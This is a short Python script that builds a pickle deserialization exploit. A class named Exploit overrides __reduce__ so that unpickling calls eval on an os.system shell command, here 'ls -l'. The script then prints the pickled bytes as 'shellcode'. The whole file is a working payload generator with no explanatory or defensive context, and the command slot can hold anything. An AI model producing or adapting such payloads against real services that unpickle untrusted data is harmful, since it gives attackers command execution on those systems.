import os
import pickle
import base64

class Exploit(object):
    def __reduce__(self):
        return (eval, ("os.system('ls -l')",))

shellcode = pickle.dumps(Exploit())
print (shellcode)